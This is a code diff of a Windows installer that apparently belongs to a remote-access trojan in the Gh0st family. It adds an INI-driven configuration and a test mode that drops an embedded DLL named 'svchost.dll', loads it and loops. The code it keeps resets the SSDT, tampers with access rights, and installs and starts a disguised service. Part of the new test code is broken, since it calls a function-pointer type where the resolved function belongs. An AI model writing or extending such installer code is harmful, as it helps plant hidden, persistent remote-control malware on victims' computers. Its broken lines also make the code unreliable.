@@ -16,6 +16,14 @@
 #include "RegEditEx.h"
 #include "log.h"
 
+#include "IniFile.h"
+
+#ifdef INSTALLER_TEST
+#pragma IMPORTANT("THIS IS ONLY FOR TESTING, IT CONTAINS DEBUG CODE< IDENTIFIABLE CODE")
+#endif
+
+typedef const char *(__stdcall* f_funcSvcHostStatus)();
+typedef const char* (__stdcall* f_funcSvcHostLastError)();
 
 void dbg_dump(struct _EXCEPTION_POINTERS* ExceptionInfo) {
 }
@@ -506,6 +514,23 @@ int memfind(const char *mem, const char *str, int sizem, int sizes)
 
 #define	MAX_CONFIG_LEN	1024
 
+LPWSTR StringToString(LPCSTR str)
+{
+	int size = MultiByteToWideChar(CP_UTF8, 0, str, -1, NULL, 0);
+	PWCHAR result = new WCHAR[size];
+	MultiByteToWideChar(CP_UTF8, 0, str, -1, result, size);
+
+	return result;
+}
+LPSTR StringToString(LPCWSTR str)
+{
+	int size = WideCharToMultiByte(CP_UTF8, 0, str, -1, NULL, 0, NULL, NULL);
+	PCHAR result = new CHAR[size];
+	WideCharToMultiByte(CP_UTF8, 0, str, -1, result, size, NULL, NULL);
+
+	return result;
+}
+
 LPCTSTR FindConfigString(HMODULE hModule, LPCTSTR lpString)
 {
 	char	strFileName[MAX_PATH];
@@ -541,6 +566,53 @@ int APIENTRY WinMain(HINSTANCE hInstance,
                      LPSTR     lpCmdLine,
                      int       nCmdShow)
 {
+
+	if (strcmp(lpCmdLine,"test") == 0) {
+
+		CIniFile iniTemp;
+		int size = MultiByteToWideChar(CP_UTF8, 0, "\\svchost.dll", -1, NULL, 0);
+		PWCHAR lpFileName = new WCHAR[size];
+		MultiByteToWideChar(CP_UTF8, 0, "\\svchost.dll", -1, lpFileName, size);
+
+
+		PWCHAR result = new WCHAR[MAX_PATH];
+		StrCpyW(result, iniTemp.GetStartupPath());
+		StrCatW(result, lpFileName);
+
+		char *dll = StringToString(result);
+		LOG_TRACE("Install::Main", "ReleaseResource %s", dll);
+		ReleaseResource(NULL, IDR_DLL, "BIN", dll, "");
+
+		HINSTANCE hGetProcIDDLL = LoadLibrary(dll);
+
+		if (!hGetProcIDDLL) {
+			
+			LOG_ERROR("Install::Main", "could not load the dynamic library");
+			return EXIT_FAILURE;
+		}
+		
+		// resolve function address here
+		f_funcSvcHostStatus funci = (f_funcSvcHostStatus)GetProcAddress(hGetProcIDDLL, "SvcHostStatus");
+		if (!funci) {
+			LOG_ERROR("Install::Main", "could not load function ");
+			return EXIT_FAILURE;
+		}
+
+		
+		LOG_TRACE("Install::Main", "SvcHostStatus() returned %s", f_funcSvcHostStatus());
+		LOG_TRACE("Install::Main", "SvcHostLastError() returned %s", f_funcSvcHostLastError());
+		int i = 0;
+		while (TRUE) {
+			i++;
+			Sleep(250);
+		}
+
+		return EXIT_SUCCESS;
+	}
+
+	
+
+
  	// TODO: Place code here.
 	//////////////////////////////////////////////////////////////////////////
 	// 让启动程序时的小漏斗马上消失
@@ -550,48 +622,23 @@ int APIENTRY WinMain(HINSTANCE hInstance,
 	GetMessage(&msg, NULL, NULL, NULL);
 	//////////////////////////////////////////////////////////////////////////
 	
+	CIniFile ini;
+	CString SvcNane = ini.GetString("Service", "RawName");
+	CString SvcDisplayNane = ini.GetString("Service", "DisplayName");
+	CString SvcDescription = ini.GetString("Service", "Description");
+	CString SvcEncodeString = ini.GetString("Service", "EncodeString");
 
-
-#ifdef SIMULATION_MODE
-	char* lpEncodeString = NULL;
-	lpEncodeString = (char *)FindConfigString(hInstance, "AAAAAA");
-#else
-	char lpEncodeString[256] = "localhost";
-#endif
-	if (lpEncodeString == NULL)
-		return -1;
-
-#ifdef SIMULATION_MODE
-	char* lpServiceDisplayName = NULL;
-	char* lpServiceDescription = NULL;
-
-	char* lpServiceConfig = NULL;
-	lpServiceConfig = (char*)FindConfigString(hInstance, "CCCCCC");
-
+	LOG_TRACE("Install::Main", "SvcDisplayNane %s", SvcDisplayNane.GetBuffer());
+	LOG_TRACE("Install::Main", "SvcDescription %s", SvcDescription.GetBuffer());
+	LOG_TRACE("Install::Main", "SvcEncodeString %s", SvcEncodeString.GetBuffer());
 	
-	if (lpServiceConfig == NULL)
-		return -1;
-	char	*pos = strchr(lpServiceConfig, '|');
-	if (pos == NULL)
-		return -1;
-	*pos = '\0';
-	lpServiceDisplayName = MyDecode(lpServiceConfig + 6);
-	lpServiceDescription = MyDecode(pos + 1);
-	if (lpServiceDisplayName == NULL || lpServiceDescription == NULL)
-		return -1;
-#else
-	char lpServiceConfig[256] = "";
-	char lpServiceDisplayName[256] = "__aa Mon Service Test";
-	char lpServiceDescription[256] = "__aa Mon Service Desctiption";
-
-#endif
-	char	*lpServiceName = NULL;
 	char	*lpUpdateArgs = "Update";
 	//////////////////////////////////////////////////////////////////////////
 	// 如果不是更新服务端
 	if (strstr(GetCommandLine(), lpUpdateArgs) == NULL)
 	{
-		HANDLE	hMutex = CreateMutex(NULL, true, lpEncodeString);
+		
+		HANDLE	hMutex = CreateMutex(NULL, true, SvcEncodeString.GetBuffer());
 		DWORD	dwLastError = GetLastError();
 		// 普通权限访问系统权限创建的Mutex,如果存在，如果存在就返回拒绝访问的错误
 		// 已经安装过一个一模一样配置的，就不安装了
@@ -613,7 +660,7 @@ int APIENTRY WinMain(HINSTANCE hInstance,
 	SetAccessRights();
 	ResetSSDT(hInstance);
 
-	lpServiceName = InstallService(lpServiceDisplayName, lpServiceDescription, lpEncodeString);
+	char * lpServiceName = InstallService(SvcDisplayNane.GetBuffer(), SvcDescription.GetBuffer(), SvcEncodeString.GetBuffer());
 
 	if (lpServiceName != NULL)
 	{
@@ -629,8 +676,6 @@ int APIENTRY WinMain(HINSTANCE hInstance,
 		LOG_TRACE("Install::Main","StartService %s", lpServiceName);
 		StartService(lpServiceName);
 		delete lpServiceName;
-		delete lpServiceDisplayName;
-		delete lpServiceDescription;
 		
 	}
 	ExitProcess(0);
